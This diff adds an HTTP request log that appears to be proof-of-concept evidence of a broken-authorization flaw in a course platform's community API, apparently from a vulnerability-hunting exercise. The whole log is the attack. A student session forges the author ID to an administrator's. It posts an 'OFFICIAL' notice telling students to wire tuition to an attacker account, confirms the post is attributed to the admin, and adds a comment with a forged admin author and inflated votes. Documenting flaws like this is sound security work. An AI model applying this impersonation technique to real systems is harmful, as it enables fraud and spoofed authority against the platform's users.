@@ -1,0 +1,16 @@
+POST /community  (STUDENT session 5c65a30d-dcc1-4ec8-a9e8-95aaf393eabe; authorProfileId forged to ADMIN 0419cf7a-0f8b-4797-b953-e8747cc41939)
+HTTP 201
+
+{"success":true,"data":{"id":8,"title":"OFFICIAL: mandatory payment portal","body":"Wire tuition to attacker-controlled account. marker=body_d6d2d5ea","votes":0,"createdAt":"2026-09-27 14:49:05.123461+00","courseId":"eeddad2e-c2cc-457b-ae5a-62e9e7989009","courseTitle":"OFFICIAL: mandatory payment portal","slug":"notice_8244f674","authorId":null}}
+
+
+GET /community/notice_8244f674  (read-back)
+HTTP 200
+
+{"success":true,"data":{"id":8,"title":"OFFICIAL: mandatory payment portal","body":"Wire tuition to attacker-controlled account. marker=body_d6d2d5ea","votes":0,"createdAt":"2026-09-27 14:49:05.123461+00","courseId":"eeddad2e-c2cc-457b-ae5a-62e9e7989009","courseTitle":"CveHunt course_63b5d246","slug":"notice_8244f674","authorId":"0419cf7a-0f8b-4797-b953-e8747cc41939","authorFullname":"admin","authorAvatarUrl":null,"organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","comments":[]}}
+
+
+POST /community/8/comment (forged author+votes)
+HTTP 201
+
+{"success":true,"data":{"id":"eeda431e-cfa3-4b5a-8eb9-2d351518b20a","body":"Forged endorsement by admin marker=body_d6d2d5ea","votes":9999,"createdAt":"2026-09-27 14:49:05.23496+00","authorId":"0419cf7a-0f8b-4797-b953-e8747cc41939"}}
